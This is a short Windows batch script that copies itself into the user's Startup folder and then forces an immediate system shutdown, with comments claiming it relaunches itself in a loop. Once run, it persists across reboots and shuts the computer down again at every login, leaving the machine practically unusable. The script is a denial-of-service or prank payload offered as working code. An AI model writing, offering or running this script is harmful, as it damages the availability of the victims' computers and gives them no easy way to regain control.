@echo off

:loop
rem Get the path to the current script
set "script_path=%~dp0"
set "script_name=%~nx0"

rem Set the destination path to the Startup folder
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Copy the script to the Startup folder
copy "%script_path%%script_name%" "%startup_folder%" > nul

rem Add a delay before shutting down the computer
timeout /t 5 /nobreak >nul

rem Shutdown the computer
shutdown /s /f /t 0

rem Reopen the terminal by running the script again
start "" "%~dpnx0"

rem Go back to the loop to ensure the terminal remains open
goto loop
